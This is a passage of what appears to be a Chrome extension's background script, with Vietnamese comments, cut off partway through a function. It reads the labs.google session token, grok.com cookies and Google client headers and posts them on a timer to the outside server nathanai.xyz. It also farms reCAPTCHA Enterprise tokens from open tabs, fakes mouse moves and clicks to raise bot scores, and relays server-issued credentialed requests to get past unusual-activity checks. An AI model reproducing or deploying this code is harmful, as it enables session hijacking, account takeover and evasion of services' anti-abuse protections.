// ===================================
// BACKGROUND SCRIPT - Service Worker
// ===================================

console.log('🔧 Background Script: Started');

// ===================================
// CAPTURE x-client-data DYNAMICALLY
// Chrome tự động thêm header này vào mọi request đến Google.
// Chúng ta intercepte để lấy giá trị thực, gửi về Python server.
// ===================================

const FIXED_API_SERVER = 'https://nathanai.xyz/';
let API_SERVER = FIXED_API_SERVER;

// Luôn ép extension chỉ trỏ về domain chính, không dùng serverUrl cũ trong storage.
chrome.storage.sync.set({ serverUrl: FIXED_API_SERVER }).catch(() => { });

let _capturedBrowserHeaders = {};
let _headersSentToServer = false;

chrome.webRequest.onSendHeaders.addListener(
    (details) => {
        if (_headersSentToServer) return; // Đã gửi rồi, không cần nữa

        const target = {};
        for (const h of (details.requestHeaders || [])) {
            const name = h.name.toLowerCase();
            if (name === 'x-client-data' && h.value) {
                target['x_client_data'] = h.value;
            }
            if (name === 'x-browser-validation' && h.value) {
                target['x_browser_validation'] = h.value;
            }
            if (name === 'x-browser-channel' && h.value) {
                target['x_browser_channel'] = h.value;
            }
        }

        if (target['x_client_data']) {
            _capturedBrowserHeaders = { ..._capturedBrowserHeaders, ...target };
            console.log('📡 Captured browser headers:', target);

            // Gửi về Python server
            fetch(`${API_SERVER}/api/browser-headers`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(_capturedBrowserHeaders)
            }).then(r => {
                if (r.ok) {
                    _headersSentToServer = true;
                    console.log('✅ Browser headers sent to server');
                }
            }).catch(() => { });
        }
    },
    { urls: ['https://*.googleapis.com/*'] },
    ['requestHeaders']
);

const FLOW_URL = 'https://labs.google/fx/tools/flow';

async function openFlowWhenEnabled() {
    try {
        const settings = await getSettings();
        if (!settings.enabled) return;

        const existingTabs = await chrome.tabs.query({ url: '*://labs.google/fx/tools/flow*' });
        if (existingTabs && existingTabs.length > 0) {
            const tab = existingTabs[0];
            await chrome.tabs.update(tab.id, { active: true, autoDiscardable: false });
            if (tab.windowId) {
                chrome.windows.update(tab.windowId, { focused: true }).catch(() => { });
            }
            return;
        }

        const tab = await chrome.tabs.create({ url: FLOW_URL, active: true });
        chrome.tabs.update(tab.id, { autoDiscardable: false }).catch(() => { });
        console.log(`🚀 Opened Flow page on extension enable: ${FLOW_URL}`);
    } catch (e) {
        console.warn('⚠️ Cannot open Flow page on extension enable:', e && e.message ? e.message : e);
    }
}

// Default settings
const DEFAULT_SETTINGS = {
    autoReload: false, // Tắt tính năng F5 sau mỗi 5 phút (Chuyển sang F5 10 phút nhàn rỗi ở content.js)
    reloadInterval: 5, // minutes
    enabled: true,
    clearGrecaptcha: false, // New setting
    serverUrl: 'https://nathanai.xyz/',
    operationMode: 'cookie' // 'cookie' = chỉ gửi cookie (không giải captcha), 'captcha' = chỉ giải captcha (không gửi cookie)
};

// Lấy settings từ storage
async function getSettings() {
    const result = await chrome.storage.sync.get(DEFAULT_SETTINGS);
    result.serverUrl = FIXED_API_SERVER;
    API_SERVER = FIXED_API_SERVER;
    return result;
}

// Lưu settings
async function saveSettings(settings) {
    await chrome.storage.sync.set({ ...settings, serverUrl: FIXED_API_SERVER });
    API_SERVER = FIXED_API_SERVER;
}

// Tạo alarm cho auto reload
async function createReloadAlarm() {
    const settings = await getSettings();

    // Xóa alarm cũ
    await chrome.alarms.clear('autoReload');

    if (settings.enabled && settings.autoReload && settings.reloadInterval > 0) {
        // Tạo alarm mới (periodInMinutes)
        await chrome.alarms.create('autoReload', {
            periodInMinutes: settings.reloadInterval
        });
        await createCountdownAlarm();
        console.log(`✅ Auto reload alarm set: ${settings.reloadInterval} minutes`);
    } else {
        console.log('⏸️ Auto reload disabled');
        await chrome.alarms.clear('countdownTick');
    }
}

// Xử lý alarm
chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (alarm.name === 'autoReload') {
        const settings = await getSettings();

        if (!settings.enabled || !settings.autoReload) {
            return;
        }

        console.log('⏰ Auto reload triggered');

        // Lấy tất cả tabs active
        const tabs = await chrome.tabs.query({ active: true });

        for (const tab of tabs) {
            try {
                // Gửi message đến content script để reload
                await chrome.tabs.sendMessage(tab.id, { type: 'RELOAD_PAGE' });
                console.log(`🔄 Reloaded tab: ${tab.id}`);
            } catch (error) {
                console.error(`Failed to reload tab ${tab.id}:`, error);
            }
        }
    }
});

// ── KEEPALIVE + IDLE CHECK alarm listener (riêng biệt, không ảnh hưởng autoReload) ──
chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (alarm.name === 'captchaKeepalive') {
        // Khi alarm fire → Chrome đã đánh thức SW → setInterval đã restart
        // → captchaPollOnce sẽ tự chạy lại → không cần làm gì thêm
        console.log('💓 Captcha keepalive — SW alive');
    }

    if (alarm.name === 'captchaIdleCheck') {
        captchaCheckIdle();
    }
});

// Gửi countdown đến tất cả tabs mỗi giây
chrome.alarms.onAlarm.addListener(async (alarm) => {
    if (alarm.name === 'countdownTick') {
        const settings = await getSettings();

        if (!settings.enabled || !settings.autoReload) {
            return;
        }

        // Lấy alarm tiếp theo
        const alarms = await chrome.alarms.getAll();
        const autoReloadAlarm = alarms.find(a => a.name === 'autoReload');

        if (autoReloadAlarm) {
            const now = Date.now();
            const alarmTime = autoReloadAlarm.scheduledTime;
            const remainingMs = Math.max(0, alarmTime - now);
            const remainingSeconds = Math.ceil(remainingMs / 1000);

            // Gửi countdown đến tất cả tabs
            const tabs = await chrome.tabs.query({});
            for (const tab of tabs) {
                try {
                    await chrome.tabs.sendMessage(tab.id, {
                        type: 'COUNTDOWN_UPDATE',
                        remainingSeconds: remainingSeconds,
                        totalSeconds: settings.reloadInterval * 60
                    });
                } catch (error) {
                    // Ignore errors for tabs that don't have content script
                }
            }
        }
    }
});

// Tạo alarm cho countdown (tick mỗi giây)
async function createCountdownAlarm() {
    await chrome.alarms.clear('countdownTick');
    await chrome.alarms.create('countdownTick', {
        periodInMinutes: 1 / 60 // Mỗi giây
    });
}

// ===================================
// AUTO COOKIE EXTRACTION & PUSH
// Tự động hút Cookie từ labs.google và grok.com
// rồi đẩy về Python server mỗi 2 phút.
// ===================================

let _lastCookieAccount = null; // email từ content.js hoặc tab URL

// Lắng nghe message từ popup hoặc content script (1 listener duy nhất)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'GET_SETTINGS') {
        getSettings().then(sendResponse);
        return true;
    }

    if (request.type === 'SAVE_SETTINGS') {
        saveSettings(request.settings).then(async () => {
            API_SERVER = FIXED_API_SERVER;
            await createReloadAlarm();
            if (request.settings.enabled) {
                await openFlowWhenEnabled();
            }
            sendResponse({ success: true });
        });
        return true;
    }

    if (request.type === 'RELOAD_NOW') {
        chrome.tabs.query({ active: true, currentWindow: true }).then(tabs => {
            if (tabs[0]) {
                chrome.tabs.sendMessage(tabs[0].id, { type: 'RELOAD_PAGE' });
                sendResponse({ success: true });
            }
        });
        return true;
    }

    if (request.type === 'CAPTCHA_STATUS_UPDATE') {
        console.log('📊 Captcha status:', request.data);
    }

    if (request.type === 'PREVENT_TAB_DISCARD') {
        chrome.tabs.query({ active: true, currentWindow: true }).then(tabs => {
            if (tabs[0]) {
                chrome.tabs.update(tabs[0].id, { autoDiscardable: false }).catch(() => { });
                console.log(`🛡️ Tab ${tabs[0].id} protected from discard`);
            }
        });
        sendResponse({ ok: true });
        return true;
    }

    // Cookie sync: content.js gửi account email lên
    if (request.type === 'SET_COOKIE_ACCOUNT') {
        _lastCookieAccount = request.account;
        console.log(`🍪 Cookie sync account set: ${_lastCookieAccount}`);
        pushCookiesToServer();
        sendResponse({ ok: true });
        return true;
    }
});

// Auto-detect account từ tab URL (backup nếu content.js không gửi message)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url) {
        try {
            const url = new URL(tab.url);
            if (url.hostname === 'labs.google') {
                let account = url.searchParams.get('captcha_account');
                if (!account && url.hash.startsWith('#captcha_account=')) {
                    account = decodeURIComponent(url.hash.substring('#captcha_account='.length));
                }
                if (account && !_lastCookieAccount) {
                    _lastCookieAccount = account;
                    console.log(`🍪 Auto-detected account from tab URL: ${account}`);
                    // Delay 5s cho trang load xong + cookies được set
                    setTimeout(() => pushCookiesToServer(), 5000);
                }
            }
        } catch (_) { }
    }
});

// Khởi tạo khi extension được install/update
chrome.runtime.onInstalled.addListener(async (details) => {
    console.log('🎉 Extension installed/updated:', details.reason);
    const settings = await getSettings();
    await saveSettings(settings);
    await createReloadAlarm();
    await openFlowWhenEnabled();
});

// Khởi tạo alarm khi service worker start
createReloadAlarm();
setTimeout(openFlowWhenEnabled, 1000);

// ── Detect account từ session API (không cần URL param) ──
async function detectAccountFromSession() {
    try {
        const resp = await fetch('https://labs.google/fx/api/auth/session', {
            credentials: 'include',
        });
        if (!resp.ok) return null;
        const data = await resp.json();
        const email = data?.user?.email;
        if (email) {
            _lastCookieAccount = email;
            console.log(`🍪 Detected account from session: ${email}`);
            return email;
        }
    } catch (e) {
        console.warn('🍪 Cannot detect account from session:', e);
    }
    return null;
}

// ── Self-bootstrap: detect account ngay khi service worker start ──
async function _bootstrapCookieAccount() {
    try {
        // Thử detect từ URL param trước (backward compat)
        const tabs = await chrome.tabs.query({});
        for (const tab of tabs) {
            if (tab.url && tab.url.includes('labs.google') && tab.url.includes('captcha_account=')) {
                try {
                    const url = new URL(tab.url);
                    let account = url.searchParams.get('captcha_account');
                    if (account) {
                        _lastCookieAccount = account;
                        console.log(`🍪 Bootstrap: detected account=${account} from URL param`);
                        setTimeout(() => pushCookiesToServer(), 3000);
                        return;
                    }
                } catch (_) { }
            }
        }
        // Fallback: detect từ session API
        const email = await detectAccountFromSession();
        if (email) {
            setTimeout(() => pushCookiesToServer(), 3000);
            return;
        }
        console.log('🍪 Bootstrap: no account detected yet (will retry via alarm)');
    } catch (e) {
        console.warn('🍪 Bootstrap error:', e);
    }
}
// Chạy bootstrap chỉ khi mode=cookie (captcha mode KHÔNG gửi cookie)
getSettings().then(s => {
    if (s.operationMode === 'cookie') {
        _bootstrapCookieAccount();
        console.log('🍪 Cookie mode → bootstrap cookie account');
    } else {
        console.log('🚫 Captcha mode → KHÔNG bootstrap cookie');
    }
});

async function extractVeoCookie() {
    try {
        const cookies = await chrome.cookies.getAll({ domain: 'labs.google' });
        const sessionCookie = cookies.find(c => c.name === '__Secure-next-auth.session-token');
        return sessionCookie ? sessionCookie.value : null;
    } catch (e) {
        console.warn('🍪 Failed to extract Veo cookie:', e);
        return null;
    }
}

async function extractGrokCookies() {
    try {
        const cookies = await chrome.cookies.getAll({ domain: '.grok.com' });
        const cookiesMain = await chrome.cookies.getAll({ domain: 'grok.com' });
        const all = [...cookies, ...cookiesMain];
        // Loại trùng theo name
        const seen = new Set();
        const unique = [];
        for (const c of all) {
            if (!seen.has(c.name)) {
                seen.add(c.name);
                unique.push({ name: c.name, value: c.value, domain: c.domain });
            }
        }
        return unique.length > 0 ? unique : null;
    } catch (e) {
        console.warn('🍪 Failed to extract Grok cookies:', e);
        return null;
    }
}

async function pushCookiesToServer() {
    // ── Gate: chỉ chạy ở chế độ Cookie Sync ───────────────────────────────
    const settings = await getSettings();
    if (settings.operationMode !== 'cookie') {
        return; // Captcha mode → không gửi cookie
    }

    // Tự tìm account nếu chưa có
    if (!_lastCookieAccount) {
        // Thử URL param trước
        try {
            const tabs = await chrome.tabs.query({});
            for (const tab of tabs) {
                if (tab.url && tab.url.includes('labs.google') && tab.url.includes('captcha_account=')) {
                    try {
                        const url = new URL(tab.url);
                        const account = url.searchParams.get('captcha_account');
                        if (account) {
                            _lastCookieAccount = account;
                            console.log(`🍪 Auto-detected account from URL: ${account}`);
                            break;
                        }
                    } catch (_) { }
                }
            }
        } catch (_) { }
    }

    // Fallback: detect từ session API
    if (!_lastCookieAccount) {
        await detectAccountFromSession();
    }

    if (!_lastCookieAccount) {
        console.log('🍪 No account detected yet');
        return;
    }

    const veoCookie = await extractVeoCookie();
    const grokCookies = await extractGrokCookies();

    if (!veoCookie && !grokCookies) {
        console.log('🍪 No cookies found to push');
        return;
    }

    const payload = {
        account: _lastCookieAccount,
    };
    if (veoCookie) payload.veo_cookie = veoCookie;
    if (grokCookies) payload.grok_cookies = grokCookies;

    try {
        const res = await fetch(`${API_SERVER}/api/cookie-sync`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
        if (res.ok) {
            console.log(`🍪 ✅ Cookies pushed for ${_lastCookieAccount} (veo=${!!veoCookie}, grok=${!!grokCookies})`);
        } else {
            console.warn(`🍪 Server rejected cookie push: ${res.status}`);
        }
    } catch (e) {
        console.warn('🍪 Failed to push cookies to server:', e);
    }
}

// Alarm: đẩy cookie ngay lần đầu, sau đó mỗi 1 giờ (chỉ khi mode=cookie)
getSettings().then(async s => {
    if (s.operationMode === 'cookie') {
        // Gửi cookie ngay lập tức lần đầu (không đợi alarm)
        console.log('🍪 Cookie mode → gửi cookie ngay lần đầu...');
        setTimeout(() => pushCookiesToServer(), 8000); // Delay 8s cho cookies load xong

        // Sau đó lặp lại mỗi 60 phút
        chrome.alarms.create('cookieSync', { delayInMinutes: 2, periodInMinutes: 2 });
        console.log('🍪 Cookie mode → tạo cookieSync alarm (mỗi 2 phút)');
    } else {
        console.log('🚫 Captcha mode → KHÔNG tạo cookieSync alarm');
    }
});
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'cookieSync') {
        pushCookiesToServer();
    }
});


// ===================================
// KEEPALIVE PORT — Giữ Service Worker sống vĩnh viễn
// Content script trên mỗi tab labs.google mở 1 port "keepalive".
// Khi CÒN BẤT KỲ port nào open → Chrome KHÔNG ĐƯỢC kill SW.
// Đây là giải pháp chuẩn MV3 thay cho setInterval (bị kill sau 30s).
// ===================================
const _keepAlivePorts = new Set();
chrome.runtime.onConnect.addListener((port) => {
    if (port.name === 'keepalive') {
        _keepAlivePorts.add(port);
        port.onDisconnect.addListener(() => {
            _keepAlivePorts.delete(port);
        });
        // Trả lời ping để content script biết SW còn sống
        port.onMessage.addListener((msg) => {
            if (msg?.type === 'ping') {
                port.postMessage({ type: 'pong' });
            }
        });
    }
});


// ===================================
// DYNAMIC PARALLEL MULTI-TAB POLLING
// Service Worker quản lý 1 pool các tab labs.google đang mở.
// Hỗ trợ CHẠY SONG SONG: 15 tab mở = giải 15 captcha TẤT CẢ CÙNG 1 LÚC!
// Duy trì số lượng long-poll request bằng chính xác số tab đang rảnh.
// ===================================

// ── Chống Chrome Memory Saver đóng tab labs.google ──
// Đánh dấu TẤT CẢ tab labs.google là "quan trọng, không được đóng"
async function protectAllLabsTabs() {
    try {
        const tabs = await chrome.tabs.query({ url: '*://labs.google/*' });
        for (const t of tabs) {
            chrome.tabs.update(t.id, { autoDiscardable: false }).catch(() => { });
        }
    } catch (_) { }
}
protectAllLabsTabs(); // Chạy ngay khi SW khởi động

// Khi bất kỳ tab labs.google nào load xong → đánh dấu nó luôn
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url && tab.url.includes('labs.google')) {
        chrome.tabs.update(tabId, { autoDiscardable: false }).catch(() => { });
    }
});


const CAPTCHA_POLL_INTERVAL = 1000;  // 1s check để tạo thêm poll nếu cần
const CAPTCHA_COOLDOWN = 10000;       // 10s nghỉ cho mỗi tab sau khi nó giải xong (Chống Google logout)
let _captchaWorkerId = null;
let _captchaLastActivity = Date.now();
let _activePolls = 0;                // Số lượng request HTTP Polling đang chờ ở Server
const _tabPool = new Map();          // tabId -> { busy: boolean, cooldownUntil: timestamp }
const CAPTCHA_IDLE_RELOAD = 10 * 60 * 1000; // 10 phút idle → reload tabs

// Xóa tab khỏi pool khi user đóng tab
chrome.tabs.onRemoved.addListener((tabId) => {
    _tabPool.delete(tabId);
});

// ── Worker Identity (1 per browser profile) ──
async function getCaptchaWorkerId() {
    if (_captchaWorkerId) return _captchaWorkerId;
    return new Promise((resolve) => {
        chrome.storage.session.get(['captchaWorkerId'], (res) => {
            if (res.captchaWorkerId) {
                _captchaWorkerId = res.captchaWorkerId;
                resolve(_captchaWorkerId);
            } else {
                const newId = 'worker_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
                chrome.storage.session.set({ captchaWorkerId: newId }, () => {
                    _captchaWorkerId = newId;
                    console.log(`🆔 Generated captcha worker ID: ${newId}`);
                    resolve(newId);
                });
            }
        });
    });
}

// ── Register + Heartbeat ──
async function registerCaptchaWorker() {
    // Gate: chỉ chạy ở chế độ Captcha Solver
    const settings = await getSettings();
    if (settings.operationMode !== 'captcha') return;

    try {
        const tabs = await chrome.tabs.query({ url: '*://labs.google/*' });
        if (tabs.length === 0) return;

        const workerId = await getCaptchaWorkerId();
        await fetch(`${API_SERVER}/captcha/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ account: workerId }),
        });
        console.log(`✅ Captcha worker registered: ${workerId}`);
    } catch (e) {
        console.warn('⚠️ Captcha worker register failed:', e.message);
    }
}
setTimeout(registerCaptchaWorker, 2000);
setInterval(async () => {
    // Gate: chỉ gửi heartbeat ở chế độ Captcha
    const settings = await getSettings();
    if (settings.operationMode !== 'captcha') return;

    try {
        const tabs = await chrome.tabs.query({ url: '*://labs.google/*' });
        if (tabs.length === 0) return;

        const workerId = await getCaptchaWorkerId();
        await fetch(`${API_SERVER}/captcha/heartbeat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ account: workerId }),
        });
    } catch (_) { }
}, 10000);

// ── KEEPALIVE: Chống Chrome MV3 terminate Service Worker sau 30s idle ──
// chrome.alarms SỐNG SÓT khi SW bị kill. Khi fire → Chrome đánh thức SW
// → background.js chạy lại từ đầu → setInterval(captchaPollOnce) tự restart.
chrome.alarms.create('captchaKeepalive', {
    delayInMinutes: 0.4,       // Bắt đầu sau ~24 giây
    periodInMinutes: 25 / 60   // Mỗi ~25 giây (Chrome enforce tối thiểu ~30s)
});

// ── Tab Pool Manager ──
async function getIdleTabsCount() {
    const tabs = await chrome.tabs.query({ url: '*://labs.google/*' });
    let count = 0;
    for (const t of tabs) {
        // Bỏ qua các tab đang bị kẹt ở trang đăng nhập/lỗi auth của Google
        if (t.url && (t.url.includes('/signin') || t.url.includes('auth/'))) {
            continue;
        }
        if (!t.discarded && t.status === 'complete') {
            const state = _tabPool.get(t.id) || { busy: false, cooldownUntil: 0 };
            if (!state.busy && Date.now() >= state.cooldownUntil) {
                count++;
            }
        }
    }
    return count;
}

// Hàm khoá Tab đồng bộ (Synchronous). Đảm bảo không bị Race Condition khi nhiều luồng poll trả vế cùng 1 lúc.
function reserveIdleTab(tabs) {
    for (const t of tabs) {
        // Không chọn các tab đang bị kẹt ở trang đăng nhập
        if (t.url && (t.url.includes('/signin') || t.url.includes('auth/'))) {
            continue;
        }
        if (!t.discarded && t.status === 'complete') {
            const state = _tabPool.get(t.id) || { busy: false, cooldownUntil: 0 };
            if (!state.busy && Date.now() >= state.cooldownUntil) {
                // CHỐT tab này ngay lập tức!
                state.busy = true;
                _tabPool.set(t.id, state);
                return t;
            }
        }
    }
    return null;
}

// ── Inject solve function into page context ──
async function _pageSolveCaptcha(siteKey, action) {
    // Random delay 5-8s giả lập người dùng đọc trang chậm rãi (Ngăn Google nhận diện bot lặp lại nhanh và logout)
    await new Promise(r => setTimeout(r, 5000 + Math.random() * 3000));

    // Đợi tối đa 5s để grecaptcha load xong (đề phòng mạng lag)
    let checks = 25;
    while (checks > 0) {
        if (typeof window.grecaptcha !== 'undefined' && window.grecaptcha.enterprise) {
            break;
        }
        await new Promise(r => setTimeout(r, 200));
        checks--;
    }

    if (typeof window.grecaptcha === 'undefined' || !window.grecaptcha.enterprise) {
        return null; // Không tìm thấy captcha trên trang này
    }
    return new Promise((resolve) => {
        // Đặt timeout cứng 25s, nếu Google recaptcha bị treo không gọi callback thì nhả luồng
        const t = setTimeout(() => resolve(null), 25000);
        window.grecaptcha.enterprise.ready(function () {
            window.grecaptcha.enterprise.execute(siteKey, { action: action })
                .then(res => { clearTimeout(t); resolve(res); })
                .catch(() => { clearTimeout(t); resolve(null); });
        });
    });
}

// ── Xử lý Job Song Song (Không await ở hàm gọi) ──
async function solveAndSubmit(tab, data, workerId) {
    try {
        // ── FINAL GATE: kiểm tra mode 1 lần nữa trước khi thực sự giải ──
        const currentMode = (await getSettings()).operationMode;
        if (currentMode !== 'captcha') {
            console.warn(`🚫 solveAndSubmit CHẶN: mode=${currentMode}, KHÔNG giải captcha. Trả null cho ${data.requestId}`);
            await fetch(`${API_SERVER}/captcha/result`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ requestId: data.requestId, token: null, account: workerId }),
            }).catch(() => { });
            return;
        }

        chrome.tabs.update(tab.id, { autoDiscardable: false }).catch(() => { });
        console.log(`🚀 Tab ${tab.id} đang bắt đầu giải reqId=${data.requestId}...`);

        const results = await chrome.scripting.executeScript({
            target: { tabId: tab.id },
            world: 'MAIN',
            func: _pageSolveCaptcha,
            args: ['6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV', data.action || 'IMAGE_GENERATION'],
        });

        let token = null;
        if (results && results.length > 0) token = results[0].result;

        // LUÔN LUÔN báo về server để Python không bị treo vô hạn
        await fetch(`${API_SERVER}/captcha/result`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                requestId: data.requestId,
                token: token,
                account: workerId,
            }),
        }).catch(() => { });

        if (token) {
            console.log(`✅ Tab ${tab.id} giải XONG token (len=${token.length}) cho ${data.requestId}`);
        } else {
            console.warn(`⚠️ Tab ${tab.id} thất bại (token null) cho ${data.requestId}. Đã báo Python Next!`);
        }
    } catch (e) {
        console.error(`❌ Tab ${tab.id} lỗi executeScript:`, e.message);

        // ── Tab crash recovery: tự động reload tab nếu bị "error page" ──
        if (e.message && (e.message.includes('error page') || e.message.includes('Cannot access'))) {
            console.warn(`🔄 Tab ${tab.id} bị crash (error page) → auto reload để phục hồi`);
            try {
                await chrome.tabs.reload(tab.id);
            } catch (reloadErr) {
                console.warn(`⚠️ Không thể reload tab ${tab.id}:`, reloadErr.message);
            }
        }

        // Lỗi sập đột ngột (tab bị đóng), cũng phải báo Python nhả luồng
        await fetch(`${API_SERVER}/captcha/result`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                requestId: data.requestId,
                token: null,
                account: workerId,
            }),
        }).catch(() => { });
    } finally {
        // Giải phóng tab, set cooldown 5s
        const state = _tabPool.get(tab.id) || { busy: true, cooldownUntil: 0 };
        state.busy = false;
        state.cooldownUntil = Date.now() + CAPTCHA_COOLDOWN;
        _tabPool.set(tab.id, state);
    }
}

// ── Dynamic Poll Loop ──
async function captchaPollOnce() {
    // Gate: chỉ chạy ở chế độ Captcha Solver
    const settings = await getSettings();
    if (settings.operationMode !== 'captcha') return;

    const idleCount = await getIdleTabsCount();

    // Nếu không có tab nào rảnh đang mở -> nghỉ
    if (idleCount === 0) return;

    // Giới hạn TỐI ĐA 3 poll/Chrome (dù có 15 tab rảnh)
    // Lý do: mỗi poll giữ 1 server thread 5s. 
    //   5 Chrome × 15 polls = 75 threads → Waitress (32 threads) CHẾT.
    //   5 Chrome × 3 polls  = 15 threads → OK, còn 17 threads cho API.
    // 3 poll vẫn đủ: nhận 3 job cùng lúc, giao cho 3 tab bất kỳ giải song song.
    const maxPolls = Math.min(idleCount, 3);
    if (_activePolls >= maxPolls) return;

    // Bắt đầu 1 kết nối poll mới
    _activePolls++;
    try {
        const workerId = await getCaptchaWorkerId();
        const res = await fetch(`${API_SERVER}/captcha/poll?account=${encodeURIComponent(workerId)}`, {
            signal: AbortSignal.timeout(8000), // 8s timeout client
        });

        if (res.status === 200) {
            const data = await res.json();
            if (!data.requestId) return;

            // ── DOUBLE-CHECK: nếu mode đã đổi sang cookie giữa chừng → hủy job ──
            const currentSettings = await getSettings();
            if (currentSettings.operationMode !== 'captcha') {
                console.warn(`⚠️ Nhận job ${data.requestId} nhưng mode=${currentSettings.operationMode} → HỦY, trả null`);
                await fetch(`${API_SERVER}/captcha/result`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ requestId: data.requestId, token: null, account: workerId }),
                }).catch(() => { });
                return;
            }

            _captchaLastActivity = Date.now();

            // Lấy toàn bộ danh sách tab hiện tại
            const tabs = await chrome.tabs.query({ url: '*://labs.google/*' });

            // Lock Tab đồng bộ (Tránh Race Condition nếu nhiều hàm poll trả về cùng lúc)
            const tab = reserveIdleTab(tabs);
            if (!tab) {
                console.warn('⚠️ Lỗi: Có việc nhưng mất dấu tab rảnh (Hoặc chớp nhoáng bị tab khác giành mất)');
                // PHẢI BÁO CHO PYTHON NẾU FAIL Ở BƯỚC NÀY
                await fetch(`${API_SERVER}/captcha/result`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ requestId: data.requestId, token: null, account: workerId }),
                }).catch(() => { });
                return;
            }

            // Giao việc cho Tab (Hàm chạy ngầm song song, không block)
            solveAndSubmit(tab, data, workerId).catch(console.error);
        }
    } catch (e) {
        // Timeout 5s từ server (bình thường) hoặc lỗi mạng
    } finally {
        _activePolls--;
    }
}

// ── Idle check: reload labs.google tabs after 10 min idle ──
function captchaCheckIdle() {
    if (Date.now() - _captchaLastActivity > CAPTCHA_IDLE_RELOAD) {
        _captchaLastActivity = Date.now();
        chrome.tabs.query({ url: '*://labs.google/*' }).then(tabs => {
            if (tabs.length > 0) {
                console.log(`🔄 Idle ${CAPTCHA_IDLE_RELOAD / 60000}m — reloading ${tabs.length} labs.google tab(s)`);
                tabs.forEach(t => chrome.tabs.reload(t.id));
            }
        });
    }
}

// Mở nhiều luồng poll song song (N tab rảnh = mở tối đa N kết nối chờ cùng lúc)
setInterval(captchaPollOnce, CAPTCHA_POLL_INTERVAL);
chrome.alarms.create('captchaIdleCheck', { delayInMinutes: 1, periodInMinutes: 1 });
console.log('🎯 Dynamic Parallel Multi-Tab Polling started (1s check)');


// ===================================
// BROWSER-TASK BRIDGE (cookie mode only)
// Server dispatch task xuống Chrome của 1 account cụ thể, extension thực thi
// fetch() trong tab labs.google → trả response. Bypass UNUSUAL_ACTIVITY vì
// request đi qua Chrome thực (TLS + cookie + reCAPTCHA tự nhiên).
// ===================================

const BTASK_POLL_INTERVAL = 1500;  // 1.5s tick
let _btaskPollActive = false;       // tránh poll chồng

// ── Function chạy trong page context (world: MAIN) — fetch trên cùng origin labs.google ──
async function _pageBrowserFetch(url, method, headers, body) {
    try {
        const r = await fetch(url, {
            method: method || 'POST',
            credentials: 'include',
            headers: headers || {},
            body: body || null,
        });
        const t = await r.text();
        return { status: r.status, body: t.slice(0, 100000) }; // cap body 100KB
    } catch (e) {
        return { status: null, error: 'fetch_exception: ' + (e && e.message ? e.message : String(e)) };
    }
}

// ── Function chạy trong page context để lấy access_token ──
async function _pageGetAccessToken() {
    try {
        const r = await fetch('https://labs.google/fx/api/auth/session', { credentials: 'include' });
        if (!r.ok) return { error: 'session_status_' + r.status };
        const d = await r.json();
        return { access_token: d && d.access_token ? d.access_token : null };
    } catch (e) {
        return { error: 'session_exception: ' + (e && e.message ? e.message : String(e)) };
    }
}

// ── Function chạy trong page context để solve captcha (kèm mouse warmup) ──
async function _pageSolveCaptchaToken(siteKey, action, withWarmup) {
    try {
        if (typeof window.grecaptcha === 'undefined' || !window.grecaptcha.enterprise) {
            // Đợi grecaptcha load tối đa 10s
            for (let i = 0; i < 50; i++) {
                await new Promise(r => setTimeout(r, 200));
                if (window.grecaptcha && window.grecaptcha.enterprise) break;
            }
        }
        if (!window.grecaptcha || !window.grecaptcha.enterprise) return null;

        // ── Warmup: simulate mouse + scroll + click → boost reCAPTCHA score ──
        // Mô phỏng user thực tế move mouse vài giây trước khi click create.
        // Tab background bị throttle → cần warmup mạnh hơn để bù.
        if (withWarmup) {
            try {
                const w = window.innerWidth || 1280;
                const h = window.innerHeight || 800;
                // 12 events spread ra 4-6s (user F5 manual đợi ~10s)
                for (let i = 0; i < 12; i++) {
                    const x = Math.floor(Math.random() * (w - 100)) + 50;
                    const y = Math.floor(Math.random() * (h - 100)) + 50;
                    document.dispatchEvent(new MouseEvent('mousemove', {
                        clientX: x, clientY: y, bubbles: true,
                    }));
                    // Scroll thường xuyên hơn (50% vs 40% cũ)
                    if (Math.random() < 0.5) {
                        window.scrollBy(0, Math.floor(Math.random() * 400) - 150);
                    }
                    // Click event ở 1 vị trí random (mô phỏng user click khám phá)
                    if (i === 5 || i === 9) {
                        document.dispatchEvent(new MouseEvent('click', {
                            clientX: x, clientY: y, bubbles: true, cancelable: true,
                        }));
                    }
                    await new Promise(r => setTimeout(r, 350 + Math.random() * 450));
                }
            } catch (_) { }
        }

        return await new Promise((resolve) => {
            const t = setTimeout(() => resolve(null), 25000);
            window.grecaptcha.enterprise.ready(function () {
                window.grecaptcha.enterprise.execute(siteKey, { action: action })
                    .then(res => { clearTimeout(t); resolve(res); })
                    .catch(() => { clearTimeout(t); resolve(null); });
            });
        });
    } catch (e) { return null; }
}

// ── Tìm tab labs.google của account bound với extension (cookie mode) ──
let _labsTabIdCache = null;
let _lastTabCreateTs = 0;

async function _waitTabComplete(tabId, timeoutMs = 15000) {
    const start = Date.now();
    while (Date.now() - start < timeoutMs) {
        try {
            const t = await chrome.tabs.get(tabId);
            if (t && t.status === 'complete' && !t.discarded) return t;
        } catch (_) { return null; }
        await new Promise(r => setTimeout(r, 500));
    }
    try { return await chrome.tabs.get(tabId); } catch (_) { return null; }
}

async function _findLabsTab() {
    const targetUrl = _lastCookieAccount
